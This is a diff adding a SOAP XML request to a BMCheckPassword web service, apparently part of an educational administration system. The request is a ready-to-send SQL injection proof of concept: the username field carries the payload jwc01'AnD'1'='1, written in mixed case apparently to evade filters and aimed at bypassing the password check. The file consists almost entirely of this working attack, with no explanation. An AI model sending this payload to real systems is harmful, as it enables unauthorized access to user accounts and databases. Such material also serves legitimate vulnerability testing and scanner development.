@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
+    xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
+    xmlns:tns="http://tempuri.org/" 
+    xmlns:types="http://tempuri.org/encodedTypes" 
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+    <q1:BMCheckPassword xmlns:q1="http://www.zf_webservice.com/BMCheckPassword">
+      <strYHM xsi:type="xsd:string">jwc01'AnD'1'='1</strYHM>
+      <strPassword xsi:type="xsd:string">a</strPassword>
+      <xh xsi:type="xsd:string">a</xh>
+    </q1:BMCheckPassword>
+  </soap:Body>
+</soap:Envelope>
